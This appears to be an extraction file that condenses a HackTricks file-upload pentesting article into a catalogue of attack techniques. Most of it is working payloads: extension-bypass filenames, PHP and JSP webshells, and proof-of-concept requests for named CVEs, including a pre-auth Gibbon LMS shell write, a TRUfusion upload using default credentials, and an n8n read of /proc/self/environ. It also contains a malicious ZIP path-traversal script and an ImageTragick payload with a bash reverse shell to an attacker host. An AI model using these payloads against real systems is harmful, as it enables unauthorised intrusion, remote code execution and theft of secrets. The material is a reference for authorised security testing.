# HackTricks Batch 2 - Deep-Read Extraction
## Source: /root/killer-queen-knowledge/hacktricks/
## Date: 2026-06-06

================================================================================
STATUS OVERVIEW
================================================================================

Of the 10 designated batch files, ONLY 1 has real content. The other 9 are
identical 404 placeholder pages (29,783 bytes each) with no attack content.

  FILES WITH REAL CONTENT:
    pentesting-web-file-upload.md (91,525 bytes) -- FULL EXTRACTION BELOW

  FILES THAT ARE 404 STUBS (no content to extract):
    pentesting-web-csrf-cross-site-request-forgery.md
    pentesting-web-xxe-xee-xml-external-entity.md
    pentesting-web-cors-bypass.md
    pentesting-web-crlf-injection.md
    pentesting-web-open-redirect.md
    pentesting-web-parameter-pollution.md
    pentesting-web-header-injection.md
    pentesting-web-clickjacking.md
    pentesting-web-csv-injection.md

  NOTE: CSRF and XXE are mentioned/referenced in other files:
    - CSRF references found in: http-request-smuggling.md, xss-cross-site-scripting.md
    - XXE references found in: file-upload.md (below), sql-injection.md, saml-attacks.md

================================================================================
ARTICLE 1: FILE UPLOAD (pentesting-web-file-upload.md)
================================================================================

--------------------------------------------------------------------------------
1. FILE UPLOAD GENERAL METHODOLOGY
--------------------------------------------------------------------------------

### Executable Extensions to Test:

PHP extensions:
  .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .pht, .phtm,
  .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module

PHPv8 working extensions:
  .php, .php4, .php5, .phtml, .module, .inc, .hphp, .ctp

ASP extensions:
  .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml,
  .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml

JSP extensions:
  .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action

Coldfusion: .cfm, .cfml, .cfc, .dbm
Flash: .swf
Perl: .pl, .cgi
Erlang Yaws: .yaws

--------------------------------------------------------------------------------
2. BYPASS FILE EXTENSION CHECKS (7 techniques)
--------------------------------------------------------------------------------

Technique 2.1 -- Case Variation:
  Use uppercase letters: pHp, .pHP5, .PhAr

Technique 2.2 -- Valid Extension Before Execution Extension:
  file.png.php
  file.png.Php5

Technique 2.3 -- Special Characters at End (bruteforce all ASCII/Unicode):
  file.php%20
  file.php%0a
  file.php%00       (null byte)
  file.php%0d%0a
  file.php/
  file.php.\
  file.
  file.php....
  file.pHp5....

Technique 2.4 -- Double Extension / Junk Data / Null Bytes:
  file.png.php
  file.png.pHp5
  file.php#.png
  file.php%00.png
  file.php\x00.png
  file.php%0a.png
  file.php%0d%0a.png
  file.phpJunk123png

Technique 2.5 -- Multi-layer Extensions:
  file.png.jpg.php
  file.php%00.png%00.jpg

Technique 2.6 -- Execution Extension BEFORE Valid Extension (Apache misconfig):
  file.php.png
  (Exploits Apache where anything with .php in filename executes,
   not necessarily ending in .php)

Technique 2.7 -- NTFS Alternate Data Stream (Windows):
  file.asax:.jpg  (empty forbidden file created, can be edited later)
  file.asp::$data.
  (Colon ":" inserted after forbidden ext, permitted ext after)

Technique 2.8 -- Filename Length Limit Overflow:
  Linux max: 255 bytes, wget truncates to 236
  Pattern: AAA<--SNIP-->.php.png where valid ext gets cut off
  Tools: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
  Python: python -c 'print "A" * 232'
  Payload: AAA<--SNIP 232 A's-->.php.png

--------------------------------------------------------------------------------
3. CVE-2024-21546: UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot)
--------------------------------------------------------------------------------

  Technique: Use valid image MIME + magic header (e.g. PNG \x89PNG\r\n\x1a\n),
  name file with PHP extension followed by dot: shell.php.
  Server strips trailing dot, persists shell.php in web-served directory.

  PoC Request:
    POST /profile/avatar HTTP/1.1
    Host: target
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
    ------WebKitFormBoundary
    Content-Disposition: form-data; name="upload"; filename="0xdf.php."
    Content-Type: image/png
    \x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
    ------WebKitFormBoundary--

  Trigger:
    GET /storage/files/0xdf.php?cmd=id

  References:
    NVD: CVE-2024-21546
    0xdf HTB Environment writeup

--------------------------------------------------------------------------------
4. BYPASS CONTENT-TYPE, MAGIC NUMBER, COMPRESSION & RESIZING
--------------------------------------------------------------------------------

### 4.1 Content-Type Bypass:
  Set header to: image/png, text/plain, application/octet-stream
  Wordlist: https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt

### 4.2 Magic Number Bypass:
  Add real image bytes at file start (confuse 'file' command)

  exiftool injection into metadata:
    exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg

  Direct payload append to image:
    echo '<?php system($_REQUEST['cmd']); ?>' >> img.png

### 4.3 Survive Compression (PHP-GD libraries):
  PLTE chunk technique (survives imagecopyresized/imagecopyresampled):
    https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html
    Generator: https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php

### 4.4 Survive Resizing:
  IDAT chunk technique (survives imagecopyresized/imagecopyresampled):
    Generator: https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php

  tEXt chunk technique (survives thumbnailImage):
    Generator: https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php

--------------------------------------------------------------------------------
5. OTHER UPLOAD TRICKS
--------------------------------------------------------------------------------

  - Find rename vulnerability to change extension post-upload
  - Find LFI to execute backdoor
  - Information disclosure techniques:
      * Upload same file multiple times simultaneously with same name
      * Upload file with name of existing file/folder
      * Upload with "." ".." or "..." as name (Apache Windows: creates file
        called "uploads" in parent dir)
      * Upload "...:.jpg" in NTFS (hard to delete)
      * Upload with invalid Windows chars: |<>*?"
      * Upload with reserved Windows names: CON, PRN, AUX, NUL, COM1-9,
        LPT1-9
  - Upload .exe or .html to execute code when victim opens it

--------------------------------------------------------------------------------
6. SPECIAL EXTENSION TRICKS
--------------------------------------------------------------------------------

  PHP server: Use .htaccess trick to execute code
  ASP server: Use .config trick to execute code (IIS)
  .phar files: Like .jar for PHP, usable as PHP file
  .inc extension: Sometimes allowed for import files, may execute

--------------------------------------------------------------------------------
7. JETTY RCE (via XML upload)
--------------------------------------------------------------------------------

  Upload .xml or .war to $JETTY_BASE/webapps/
  Jetty auto-processes .xml and .war files
  Reference: @ptswarm tweet

--------------------------------------------------------------------------------
8. uWSGI RCE (via .ini config file modification)
--------------------------------------------------------------------------------

  uWSGI config files support "magic" variables/operators
  The '@' operator: @(filename) includes file contents
  'exec' scheme: @(exec://command) reads process stdout

  Malicious uwsgi.ini example:
    [uwsgi]
    foo = @(sym://uwsgi_funny_function)
    bar = @(data://[REDACTED])
    test = @(http://[REDACTED])
    content = @(fd://[REDACTED])
    body = @(exec://whoami)
    extra = @(exec://curl http://collaborator-unique-host.oastify.com)
    characters = @(call://uwsgi_func)

  Payload executes during config file parsing
  Requires process restart/crash OR auto-reload enabled
  Can be inserted into binary files (images, PDFs)
  Reference: https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html

--------------------------------------------------------------------------------
9. CVE-2023-45878: Gibbon LMS Arbitrary File Write to Pre-Auth RCE
--------------------------------------------------------------------------------

  Unauthenticated endpoint allows arbitrary file write inside web root
  Vulnerable: up to and including v25.0.01

  Endpoint: /Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php
  Method: POST

  Required params:
    - img: data-URI-like format: [mime];[name],[base64]
      (server ignores type/name, base64-decodes the tail)
    - path: destination filename relative to Gibbon install dir
    - gibbonPersonID: any non-empty value (e.g., 0000000001)

  PoC (write test file):
    printf '0xdf was here!' | base64
    # => MHhkZiB3YXMgaGVyZSEK
    curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
      -d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'
    curl http://target/Gibbon-LMS/poc.php

  PoC (webshell):
    # '<?php system($_GET["cmd"]); ?>' base64
    # PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==
    curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
      -d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'
    curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'

  Handler does base64_decode($_POST["img"]) after splitting by ; and ,
  Writes bytes to $absolutePath . '/' . $_POST['path'] without validation

--------------------------------------------------------------------------------
10. WGET FILE UPLOAD/SSRF TRICK
--------------------------------------------------------------------------------

  Server uses wget to download files; you control the URL
  Extension whitelist bypass via filename length:
    - Linux max filename: 255 chars, wget truncates to 236
    - Download file named "A"*232+".php"+".gif"
    - Check allows .gif, but wget renames to "A"*232+".php"

  Setup:
    echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
    python3 -m http.server 9080

  Trigger:
    wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
    # wget: "The name is too long, 240 chars total. Trying to shorten..."
    # Saved as: 'AAA...AAA.php'

  NOTE: HTTP redirect won't work for this bypass UNLESS wget uses
  --trust-server-names (otherwise wget saves with original URL's filename)

--------------------------------------------------------------------------------
11. ESCAPING UPLOAD DIRECTORY VIA NTFS JUNCTIONS (Windows)
--------------------------------------------------------------------------------

  Requires local access to Windows machine
  When uploads stored under per-user subfolders you control:

  Flow:
    1) Upload to learn per-user folder name (e.g., md5 of form fields)
    2) Remove folder, create junction to webroot:
       rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
       cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs
    3) Re-upload payload; it lands under C:\xampp\htdocs
    4) Trigger: curl "http://TARGET/shell.php?cmd=whoami"

  mklink /J creates NTFS directory junction (reparse point)
  Web server account must follow junction + have write permission

  Sample webshell payload:
    <?php echo shell_exec($_REQUEST['cmd']); ?>

  References: 0xdf HTB Media writeup

--------------------------------------------------------------------------------
12. GZIP-COMPRESSED BODY UPLOAD + PATH TRAVERSAL -> JSP WEBSHELL (Tomcat)
--------------------------------------------------------------------------------

  Handler writes raw request body to user-controlled path
  Supports Content-Encoding: gzip; no path canonicalization

  Exploitation flow:
    - Gzip-compress JSP webshell payload
    - POST with path parameter containing traversal + Content-Encoding: gzip
    - Browse to written file to trigger

  Request:
    POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2fjsp%2f&file=shell.jsp HTTP/1.1
    Host: target
    Content-Type: application/octet-stream
    Content-Encoding: gzip
    Content-Length: <len>
    <gzip-compressed-bytes-of-your-jsp>

  Trigger:
    GET /jsp/shell.jsp?cmd=id HTTP/1.1

  Notes:
    - Burp Suite Hackvertor extension can produce gzip body
    - Target paths vary by install
    - Pure pre-auth arbitrary file write -> RCE

--------------------------------------------------------------------------------
13. AXIS2 SOAP UPLOADFILE TRAVERSAL TO TOMCAT WEBROOT
--------------------------------------------------------------------------------

  Axis2 uploadFile SOAP action with attacker-controlled:
    - jobDirectory (destination directory)
    - archiveName (filename)
    - dataHandler (base64 content)

  Default creds often: admin / trubiquity

  Request:
    POST /services/WsPortalV6UpDwAxis2Impl HTTP/1.1
    Host: 127.0.0.1
    Content-Type: text/xml

    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
      xmlns:updw="http://updw.webservice.ddxPortalV6.ddxv6.procaess.com">
      <soapenv:Body>
        <updw:uploadFile>
          <updw:login>admin</updw:login>
          <updw:password>trubiquity</updw:password>
          <updw:archiveName>shell.jsp</updw:archiveName>
          <updw:jobDirectory>/../../../../opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/</updw:jobDirectory>
          <updw:dataHandler>PD8lQCBwYWdlIGltcG9ydD0iamF2YS5pby4qIjsgc3lzdGVtKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSk7Pz4=</updw:dataHandler>
        </updw:uploadFile>
      </soapenv:Body>
    </soapenv:Envelope>

  Often localhost-only; pair with full-read SSRF to reach 127.0.0.1
  After writing: /trufusionPortal/jsp/shell.jsp?cmd=id

--------------------------------------------------------------------------------
14. FROM FILE UPLOAD TO OTHER VULNERABILITIES
--------------------------------------------------------------------------------

  Path Traversal:
    filename = ../../../tmp/lol.png

  SQL Injection:
    filename = sleep(10)-- -.jpg

  XSS:
    filename = <svg onload=alert(document.domain)>
    SVG file upload for stored XSS
    JS file upload + XSS = Service Workers exploitation

  Command Injection:
    filename = ; sleep 10;

  XXE:
    XXE in SVG upload
    PDF upload XXE + CORS bypass
    Blind XXE via PDF/PPTX upload

  Open Redirect:
    Open Redirect via uploading SVG file

  SSRF:
    If web server fetches images from URL, abuse SSRF
    Use iplogger.org/invisible/ to steal visitor info

  ImageTragic (ImageMagick 7.0.1-1):
    See Section 17 below

  Other:
    Upload EICAR test string (https://secure.eicar.org/eicar.com.txt) for AV check
    Check size limits

  TOP 10 Upload Attack Types:
    1. ASP/ASPX/PHP5/PHP/PHP3: Webshell / RCE
    2. SVG: Stored XSS / SSRF / XXE
    3. GIF: Stored XSS / SSRF
    4. CSV: CSV injection
    5. XML: XXE
    6. AVI: LFI / SSRF
    7. HTML/JS: HTML injection / XSS / Open redirect
    8. PNG/JPEG: Pixel flood attack (DoS)
    9. ZIP: RCE via LFI / DoS
    10. PDF/PPTX: SSRF / BLIND XXE

--------------------------------------------------------------------------------
15. MAGIC HEADER BYTES
--------------------------------------------------------------------------------

  PNG: "\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["
  JPG: "\xff\xd8\xff"
  More: https://en.wikipedia.org/wiki/List_of_file_signatures

--------------------------------------------------------------------------------
16. ZIP/TAR AUTO-DECOMPRESS ATTACKS
--------------------------------------------------------------------------------

### 16.1 Symlink Attack:
    ln -s ../../../index.php symindex.txt
    zip --symlinks test.zip symindex.txt
    tar -cvf test.tar symindex.txt
    (Accessing decompressed files accesses linked files)

### 16.2 Path Traversal in Archive (evilarc):
    Automated tool: https://github.com/ptoomey3/evilarc
    python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php

### 16.3 Python Malicious ZIP Creator:
    #!/usr/bin/python
    import zipfile
    from io import BytesIO

    def create_zip():
        f = BytesIO()
        z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
        z.writestr('../../../../../var/www/html/webserver/shell.php',
                   '<?php echo system($_REQUEST["cmd"]); ?>')
        z.writestr('otherfile.xml', 'Content of the file')
        z.close()
        zip = open('poc.zip','wb')
        zip.write(f.getvalue())
        zip.close()
    create_zip()

### 16.4 File Spraying via vi/hexedit:
    for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
    zip cmd.zip xx*.php
    # In vi:
    :set modifiable
    :%s/xxA/..\//g
    :x!
    (Changes internal filenames to "../../" for traversal)

--------------------------------------------------------------------------------
17. ZIP NUL-BYTE FILENAME SMUGGLING (PHP ZipArchive Confusion)
--------------------------------------------------------------------------------

  When backend validates using PHP ZipArchive (truncates at NUL) but
  filesystem extraction writes raw names:

  Flow:
    1) Build polyglot PDF with embedded PHP webshell
    2) Name it shell.php..pdf, zip it
    3) Hex-edit ZIP local header + central directory: replace dot after .php
       with 0x00 => shell.php\x00.pdf
    4) ZipArchive sees "shell.php" (truncated at NUL), validator thinks it's .pdf
    5) Filesystem writes "shell.php" (drops after NUL)

  PoC:
    printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST[\"cmd\"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf
    cp embedded.pdf shell.php..pdf
    zip null.zip shell.php..pdf
    # Hex-edit local header + central directory:
    # Replace dot after ".php" with 00 (NUL) => shell.php\x00.pdf

  Verification:
    php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
    # Shows truncated at NUL (looks like .pdf suffix)

  Tools: hexcurse, bless, bvi, wxHexEditor

  Reference: 0xdf HTB Certificate writeup

--------------------------------------------------------------------------------
18. STACKED/CONCATENATED ZIPS (PARSER DISAGREEMENT)
--------------------------------------------------------------------------------

  Concatenate two valid ZIP files; different parsers use different EOCD records
  Most tools use last EOCD; some libraries (ZipArchive) may parse first

  PoC:
    printf test > t1; printf test2 > t2
    zip zip1.zip t1; zip zip2.zip t2
    cat zip1.zip zip2.zip > combo.zip
    unzip -l combo.zip   # warns; often lists last archive entries
    php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'

  Abuse pattern:
    - Create benign archive (allowed type) + evil archive (blocked type)
    - cat benign.zip evil.zip > combined.zip
    - If validator sees benign.zip but extractor processes evil.zip = win

  Reference: 0xdf HTB Certificate writeup

--------------------------------------------------------------------------------
19. IMAGETRAGIC (ImageMagick 7.0.1-1)
--------------------------------------------------------------------------------

  Upload with image extension:
    push graphic-context
    viewbox 0 0 640 480
    fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
    pop graphic-context

  Reference: https://www.exploit-db.com/exploits/39767

--------------------------------------------------------------------------------
20. EMBEDDING PHP SHELL IN PNG (IDAT CHUNK)
--------------------------------------------------------------------------------

  Functions imagecopyresized and imagecopyresampled from PHP-GD
  Shell in IDAT chunk survives resizing/resampling

  Reference: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

--------------------------------------------------------------------------------
21. POLYGLOT FILES
--------------------------------------------------------------------------------

  Files valid in multiple formats simultaneously
  Examples: GIFAR (GIF + RAR), GIF+JS, PPT+JS
  Also: PHAR + JPEG, etc.

  Use: Bypass file type security checks
  Limitation: Extension policies may still block

  Reference: https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a

--------------------------------------------------------------------------------
22. UPLOAD VALID JSONS FAKE AS PDF
--------------------------------------------------------------------------------

  From: https://blog.doyensec.com/2025/01/09/cspt-file-upload.html

  Against mmmagic library:
    Add %PDF magic bytes within first 1024 bytes of JSON

  Against pdflib library:
    Add fake PDF format inside a JSON field so library thinks it's PDF

  Against 'file' binary:
    Create JSON bigger than 1048576 bytes (file's read limit)
    Put initial part of real PDF inside; 'file' will identify as PDF

--------------------------------------------------------------------------------
23. CONTENT-TYPE CONFUSION TO ARBITRARY FILE READ
--------------------------------------------------------------------------------

  Handler trusts parsed request body (context.getBodyData().files)
  Copies from file.filepath without enforcing multipart/form-data

  If server accepts application/json, supply fake files object:

    POST /form/vulnerable-form HTTP/1.1
    Host: target
    Content-Type: application/json

    {
      "files": {
        "document": {
          "filepath": "/proc/self/environ",
          "mimetype": "image/png",
          "originalFilename": "x.png"
        }
      }
    }

  Backend copies file.filepath -> arbitrary file read
  Chain: /proc/self/environ -> $HOME/.n8n/config -> $HOME/.n8n/database.sqlite

  Reference: https://github.com/Chocapikk/CVE-2026-21858 (n8n form upload)

--------------------------------------------------------------------------------
24. CORRUPTING UPLOAD INDICES WITH SNPRINTF QUIRKS (historical)
--------------------------------------------------------------------------------

  Legacy upload handlers using snprintf() to build multi-file arrays
  Due to truncation inconsistencies, a single upload appears as multiple
  indexed files, confusing logic that assumes strict shape

--------------------------------------------------------------------------------
25. TOOLS
--------------------------------------------------------------------------------

  Upload Bypass: https://github.com/sAjibuu/Upload_Bypass
    (Automated file upload testing tool for pentesters/bug hunters)

  Burp Extension (upload-scanner):
    https://github.com/portswigger/upload-scanner

  Fuxploider: https://github.com/almandin/fuxploider

  mod0BurpUploadScanner: https://github.com/modzero/mod0BurpUploadScanner

  SVG Cheatsheet: https://github.com/allanlw/svg-cheatsheet

--------------------------------------------------------------------------------
26. KEY REFERENCES
--------------------------------------------------------------------------------

  PayloadsAllTheThings (Upload Insecure Files):
    https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files

  uWSGI RCE: https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html

  CSPT File Upload: https://blog.doyensec.com/2025/01/09/cspt-file-upload.html

  Persistent PHP Payloads in PNGs:
    https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html

  Polyglot Files: https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a

  TRUfusion Vulnerabilities:
    https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/
    https://www.rcesecurity.com/2026/02/when-audits-fail-from-pre-auth-ssrf-to-rce-in-trufusion-enterprise/

  Gibbon LMS: https://herolab.usd.de/security-advisories/usd-2023-0025/

  The Art of PHP (CTF exploits): https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/

================================================================================
END OF BATCH 2 EXTRACTION
================================================================================
